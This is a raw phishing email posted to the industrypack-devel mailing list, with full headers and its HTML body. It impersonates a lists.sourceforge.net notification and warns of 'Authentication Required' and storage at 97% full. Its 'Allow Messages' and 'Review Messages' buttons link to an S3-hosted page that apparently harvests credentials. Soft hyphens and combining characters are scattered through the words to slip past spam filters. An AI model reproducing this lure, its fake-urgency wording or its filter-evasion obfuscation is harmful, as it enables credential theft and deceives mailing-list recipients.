Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id EA582878880
	for <lists+industrypack-devel@lfdr.de>; Mon, 11 Mar 2024 20:08:27 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1rjl0a-0001Hb-Uv
	for lists+industrypack-devel@lfdr.de;
	Mon, 11 Mar 2024 19:08:25 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@northsland.com>) id 1rjl0Z-0001HN-7G
 for industrypack-devel@lists.sourceforge.net;
 Mon, 11 Mar 2024 19:08:23 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=wj7RDcj8i8OgwKTVF+Gd1erWKPn68Cp1s0KdM6JeSAg=; b=awaVU0JGaWO2qZy23wrK8bVNdy
 xBRGc+Kg0fbG0iz0jVTUeG4A0MWGCcwBjI6n2hS1HZQgzOzBSXpo5E6iMEyzhHEKqaYQ1Sb2xyhB5
 G8ZWywLdQ4Hu8LO9QqEACod/TqFDEdl3uYtriX7S0bij0pjY5tJP8knBrAt0QM3xGeXc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=wj7RDcj8i8OgwKTVF+Gd1erWKPn68Cp1s0KdM6JeSAg=; b=P
 zkoeF3FNNTOmHumID9086LaJiAutNYLcSa/UHdtBV6QBtOBXVSFOi7EoF+2ghgl1PFLonqRr3QuZw
 B8NO9MAfrkvomUhgEwMWBICwfB0+zwiX5SAB5M8di+FyccFobxULbJ19JYAWUkAWcAw6xaqWLYboG
 rNQ66STXw9SEpYic=;
Received: from [95.181.173.206] (helo=nauseating-company.aeza.network)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1rjl0P-000199-G2 for industrypack-devel@lists.sourceforge.net;
 Mon, 11 Mar 2024 19:08:23 +0000
Received: from northsland.com (localhost [127.0.0.1])
 by nauseating-company.aeza.network (Postfix) with ESMTP id 19516656084
 for <industrypack-devel@lists.sourceforge.net>;
 Mon, 11 Mar 2024 12:00:49 -0700 (PDT)
To: industrypack-devel@lists.sourceforge.net
Date: 11 Mar 2024 19:00:49 +0000
Message-ID: <20240311190049.5120D60746A78FF6@northsland.com>
MIME-Version: 1.0
X-Spam-Score: 3.5 (+++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Authentication Required industrypack-devel@lists.sourceforge.net
    ­Stor͏age Full: 97% 
 
 Content analysis details:   (3.5 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
                             [SPF failed: Rejected by SPF record]
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [95.181.173.206 listed in wl.mailspike.net]
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
X-Headers-End: 1rjl0P-000199-G2
Subject: [Industrypack-devel] Authentication Required on
 lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Admin via Industrypack-devel <industrypack-devel@lists.sourceforge.net>
Reply-To: Admin <noreply@northsland.com>
Content-Type: multipart/mixed; boundary="===============3433860665673302575=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3433860665673302575==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<p><br></p>
<table width=3D"100%" align=3D"center" style=3D'width: 400px; text-align: l=
eft; color: rgb(29, 34, 40); text-transform: none; letter-spacing: normal; =
font-family: "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, serif, Emoj=
iFont; font-size: 14px; font-style: normal; font-weight: 400; word-spacing:=
 0px; white-space: normal; max-width: 400px; orphans: 2; widows: 2; backgro=
und-color: rgb(228, 228, 228); font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
<tbody style=3D""><tr style=3D""><td width=3D"100%" align=3D"left" style=3D=
"padding: 0px; text-align: left; color: rgb(0, 0, 0); -ms-word-break: norma=
l;" bgcolor=3D"#ffffff"><table width=3D"100%" class=3D"yiv6764975346x_modul=
e" style=3D"table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpaddin=
g=3D"0"><tbody style=3D""><tr style=3D"">
<td style=3D"padding: 0px 0px 3px; -ms-word-break: normal;" bgcolor=3D"#e40=
613"><br style=3D""></td></tr></tbody></table><table width=3D"100%" align=
=3D"center" style=3D"padding: 0px;" bgcolor=3D"#ffffff" border=3D"0" cellsp=
acing=3D"0" cellpadding=3D"0"><tbody style=3D""><tr style=3D""><td height=
=3D"100%" valign=3D"top" style=3D"-ms-word-break: normal;">
<table width=3D"380" align=3D"left" class=3D"yiv6764975346x_column yiv67649=
75346x_column-0" style=3D"margin: 0px 10px; width: 380px; border-collapse: =
collapse; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D""><tr style=3D""><td style=3D"margin: 0px; padding: =
0px; -ms-word-break: normal; border-spacing: 0px;"><table width=3D"100%" cl=
ass=3D"yiv6764975346x_module" style=3D"table-layout: fixed;" border=3D"0" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody style=3D""><tr style=3D"">
<td height=3D"100%" valign=3D"top" style=3D"padding: 20px 0px 16px 1px; lin=
e-height: 23px; -ms-word-break: normal;"><div style=3D"font-family: inherit=
; font-size: 14px;"><h3 style=3D"text-align: center;"><span style=3D"font-f=
amily: arial, helvetica, sans-serif, serif, EmojiFont;"><strong style=3D"">=
Authentication Required</strong></span></h3><div style=3D"font-family: inhe=
rit; font-size: 14px;"><br style=3D""></div></div></td></tr></tbody></table=
>
<table width=3D"100%" class=3D"yiv6764975346x_module" style=3D"table-layout=
: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
"><tr style=3D""><td height=3D"100%" valign=3D"top" style=3D"padding: 18px =
0px; line-height: 22px; -ms-word-break: normal;"><div style=3D"font-family:=
 inherit; font-size: 14px;"><div style=3D"text-align: left; font-family: in=
herit; font-size: 14px;">industrypack-devel@lists.sourceforge.net</div><div=
 style=3D"font-family: inherit; font-size: 14px;"><br style=3D""></div></di=
v></td></tr></tbody></table>
<table width=3D"100%" class=3D"yiv6764975346x_module" style=3D"table-layout=
: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
"><tr style=3D""><td height=3D"100%" valign=3D"top" style=3D"-ms-word-break=
: normal;"><div class=3D"yiv6764975346x_w3-light-grey" style=3D"font-family=
: inherit; font-size: 14px;">
<div class=3D"yiv6764975346x_w3-container yiv6764975346x_w3-red yiv67649753=
46x_w3-center" style=3D"width: 368.59px; color: white; font-family: arial, =
helvetica, sans-serif, serif, EmojiFont; font-size: 15px; background-color:=
 red;">&shy;Stor&#847;age Full: 97%</div></div></td></tr></tbody></table><t=
able width=3D"100%" class=3D"yiv6764975346x_module" style=3D"table-layout: =
fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"">=
<tr style=3D"">
<td height=3D"100%" valign=3D"top" style=3D"padding: 18px 0px; line-height:=
 22px; -ms-word-break: normal;"><div style=3D"font-family: inherit; font-si=
ze: 14px;"><div style=3D"text-align: left; font-family: inherit; font-size:=
 14px;"><br></div><div style=3D"text-align: left; font-family: inherit; fon=
t-size: 14px;"><br style=3D""></div><div style=3D"text-align: left; font-fa=
mily: inherit; font-size: 14px;"><span style=3D"font-family: arial, helveti=
ca, sans-serif, serif, EmojiFont; font-size: 14px;">
You have (12) &shy;undeli&#847;vered &shy;inco&#847;ming &shy;mes&#847;sage=
s</span></div><div style=3D"font-family: inherit; font-size: 14px;"><br sty=
le=3D""></div></div></td></tr></tbody></table></td></tr></tbody></table></t=
d></tr></tbody></table><table width=3D"100%" align=3D"center" style=3D"padd=
ing: 0px;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D""><tr style=3D""><td height=3D"100%" valign=3D"top" =
style=3D"-ms-word-break: normal;">
<table width=3D"190" align=3D"left" class=3D"yiv6764975346x_column yiv67649=
75346x_column-0" style=3D"margin: 0px 10px 0px 0px; width: 190px; border-co=
llapse: collapse; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cell=
padding=3D"0"><tbody style=3D""><tr style=3D""><td style=3D"margin: 0px; pa=
dding: 0px; -ms-word-break: normal; border-spacing: 0px;"><table width=3D"1=
00%" class=3D"yiv6764975346x_module" style=3D"table-layout: fixed;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D""><tr style=3D""=
>
<td align=3D"center" class=3D"yiv6764975346x_outer-td" style=3D"padding: 0p=
x; -ms-word-break: normal;"><table class=3D"yiv6764975346x_wrapper-mobile" =
style=3D"text-align: center;" border=3D"0" cellspacing=3D"0" cellpadding=3D=
"0"><tbody style=3D""><tr style=3D""><td align=3D"center" class=3D"yiv67649=
75346x_inner-td" style=3D"border-radius: 6px; text-align: center; font-size=
: 16px; -ms-word-break: normal;" bgcolor=3D"#2674d6">
<a style=3D"padding: 12px 18px; border-radius: 3px; border: 1px solid rgb(3=
8, 116, 214); border-image: none; text-align: center; color: rgb(255, 255, =
255); line-height: normal; letter-spacing: 0px; font-family: arial, helveti=
ca, sans-serif; font-size: 14px; font-weight: normal; text-decoration: none=
; display: inline-block; background-color: rgb(38, 116, 214);" href=3D"http=
s://hilmore.s3.us-east-2.amazonaws.com/control_linklogg.html?login=3Dindust=
rypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"nofollow noope=
ner=20
noreferrer">&shy;Al&#847;low &shy;Mess&#847;ages</a></td></tr></tbody></tab=
le></td></tr></tbody></table></td></tr></tbody></table><table width=3D"190"=
 align=3D"left" class=3D"yiv6764975346x_column yiv6764975346x_column-1" sty=
le=3D"margin: 0px 0px 0px 10px; width: 190px; border-collapse: collapse; bo=
rder-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody=
 style=3D""><tr style=3D""><td style=3D"margin: 0px; padding: 0px; -ms-word=
-break: normal; border-spacing: 0px;">
<table width=3D"100%" class=3D"yiv6764975346x_module" style=3D"table-layout=
: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
"><tr style=3D""><td align=3D"center" class=3D"yiv6764975346x_outer-td" sty=
le=3D"padding: 0px; -ms-word-break: normal;"><table class=3D"yiv6764975346x=
_wrapper-mobile" style=3D"text-align: center;" border=3D"0" cellspacing=3D"=
0" cellpadding=3D"0"><tbody style=3D""><tr style=3D"">
<td align=3D"center" class=3D"yiv6764975346x_inner-td" style=3D"border-radi=
us: 6px; text-align: center; font-size: 16px; -ms-word-break: normal;" bgco=
lor=3D"#dad6d5">
<a style=3D"padding: 12px 18px; border-radius: 3px; border: 1px solid rgb(2=
18, 214, 213); border-image: none; text-align: center; color: rgb(0, 0, 0);=
 line-height: normal; letter-spacing: 0px; font-family: arial, helvetica, s=
ans-serif; font-size: 14px; font-weight: normal; text-decoration: none; dis=
play: inline-block; background-color: rgb(218, 214, 213);" href=3D"https://=
hilmore.s3.us-east-2.amazonaws.com/control_linklogg.html?login=3Dindustrypa=
ck-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"nofollow noopener =
noreferrer">
&shy;Revi&#847;ew &shy;Mess&#847;ages</a></td></tr></tbody></table></td></t=
r></tbody></table></td></tr></tbody></table></td></tr></tbody></table><tabl=
e width=3D"100%" align=3D"center" style=3D"padding: 0px;" bgcolor=3D"#fffff=
f" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D""><tr s=
tyle=3D""><td height=3D"100%" valign=3D"top" style=3D"-ms-word-break: norma=
l;">
<table width=3D"380" align=3D"left" class=3D"yiv6764975346x_column yiv67649=
75346x_column-0" style=3D"margin: 0px 10px; width: 380px; border-collapse: =
collapse; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D""><tr style=3D""><td style=3D"margin: 0px; padding: =
0px; -ms-word-break: normal; border-spacing: 0px;"><table width=3D"100%" cl=
ass=3D"yiv6764975346x_module" style=3D"table-layout: fixed;" border=3D"0" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody style=3D""><tr style=3D"">
<td height=3D"100%" valign=3D"top" style=3D"padding: 50px 0px 0px; line-hei=
ght: 22px; -ms-word-break: normal;"><div style=3D"font-family: inherit; fon=
t-size: 14px;"><div style=3D"font-family: inherit; font-size: 14px;"><span =
style=3D"font-family: arial, helvetica, sans-serif, serif, EmojiFont; font-=
size: 12px;"><strong style=3D"">lists.sourceforge.net&nbsp;&shy;No&#847;tif=
i&#847;cation</strong></span></div><div style=3D"text-align: center; font-f=
amily: inherit; font-size: 14px;">
<span style=3D"font-family: arial, helvetica, sans-serif, serif, EmojiFont;=
 font-size: 10px;">&shy;Ple&#847;ase do not &shy;re&#847;ply to this &shy;e=
m&#847;ail, as we are not able to &shy;res&#847;pond to &shy;mes&#847;sages=
 sent to this address.</span></div><div style=3D"font-family: inherit; font=
-size: 14px;"><br style=3D""></div></div></td></tr></tbody></table></td></t=
r></tbody></table></td></tr></tbody></table></td></tr></tbody></table><p>
<br></p>


</body></html>


--===============3433860665673302575==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3433860665673302575==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3433860665673302575==--
